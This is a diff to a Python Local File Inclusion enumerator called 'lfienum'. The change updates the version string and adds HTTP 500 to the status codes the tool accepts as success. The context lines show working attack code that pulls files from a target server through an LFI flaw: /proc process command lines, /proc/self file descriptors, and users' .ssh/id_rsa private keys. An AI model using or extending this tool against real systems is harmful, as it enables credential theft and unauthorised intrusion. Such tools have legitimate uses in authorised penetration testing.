@@ -11,7 +11,7 @@ ColEnd="\033[0m"
 
 def Help():
 
-  print ('Local File Inclusion Enumerator v1.0 by 0bfxgh0st*')
+  print ('Local File Inclusion Enumerator v1.0.1 by 0bfxgh0st*')
   print ("Usage python3 lfienum <url> <option>\n")
   print ("Options:\n")
   print ("    -X POST/GET                   Request method\n")
@@ -1303,7 +1303,7 @@ def Enum(prior_wordlist, later_wordlist):
         response = request(url, data={data:possible_lfi_file}, verify=True, headers=headers, allow_redirects=False)		
       if cookie_mode is None and data_mode is None:		
         response = request(url + possible_lfi_file, verify=True, headers=headers, allow_redirects=False)
-      if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
+      if response.status_code == 200 or response.status_code == 301 or response.status_code == 302 or response.status_code == 500:
         content = XCF(response)       			        
         if len(content) > 0 and content != blacklist:
           if cookie_mode == True:
@@ -1330,7 +1330,7 @@ def Wordlist():
         response = request(url, data={data:possible_lfi_file.strip()}, verify=True, headers=headers, allow_redirects=False)			
       if cookie_mode is None and data_mode is None:
         response = request(url + possible_lfi_file.strip(), verify=True, headers=headers, allow_redirects=False)
-      if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
+      if response.status_code == 200 or response.status_code == 301 or response.status_code == 302 or response.status_code == 500:
         content = XCF(response)
         if len(content) > 0 and content != blacklist:				
           if cookie_mode == True:					
@@ -1356,7 +1356,7 @@ def PIDS():
       response = request(url, data={data:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)		
     if cookie_mode is None and data_mode is None:		
       response = request(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
-    if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
+    if response.status_code == 200 or response.status_code == 301 or response.status_code == 302 or response.status_code == 500:
       content = XCF(response)
       if len(content) > 0 and content != blacklist:
         if only_url == False:
@@ -1381,7 +1381,7 @@ def PID():
     response = request(url, data={data:'/proc/' + str(pid) + '/cmdline'}, verify=True, headers=headers, allow_redirects=False)	
   if cookie_mode is None and data_mode is None:		
     response = request(url + '/proc/' + str(pid) + '/cmdline', verify=True, headers=headers, allow_redirects=False)
-  if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
+  if response.status_code == 200 or response.status_code == 301 or response.status_code == 302 or response.status_code == 500:
     content = XCF(response)
     if len(content) > 0 and content != blacklist:
       if only_url == False:
@@ -1408,7 +1408,7 @@ def FD(fd):
       response = request(url, data={data:'/proc/self/fd/' + str(fd)}, verify=True, headers=headers, allow_redirects=False)		
     if cookie_mode is None and data_mode is None:
       response = request(url + '/proc/self/fd/' + str(fd), verify=True, headers=headers, allow_redirects=False)
-    if response.status_code == 200 or response.status_code == 301 or response.status_code == 302:
+    if response.status_code == 200 or response.status_code == 301 or response.status_code == 302 or response.status_code == 500:
       content = XCF(response)
       if len(content) > 0 and content != blacklist:		
         if cookie_mode == True:				
@@ -1470,7 +1470,7 @@ def IdRSA():
       if cookie_mode is None and data_mode is None:			
         fetch_id_rsa = request(url + '/home/' + fetch_users.split(":")[0].strip() + '/.ssh/id_rsa', verify=True, headers=headers, allow_redirects=False)
       response = fetch_id_rsa
-      if fetch_id_rsa.status_code == 200 or fetch_id_rsa.status_code == 301 or fetch_id_rsa.status_code == 302:
+      if fetch_id_rsa.status_code == 200 or fetch_id_rsa.status_code == 301 or fetch_id_rsa.status_code == 302 or fetch_id_rsa.status_code == 500:
         content = XCF(response)
         if len(content) > 0 and content != blacklist:
           if cookie_mode == True:					
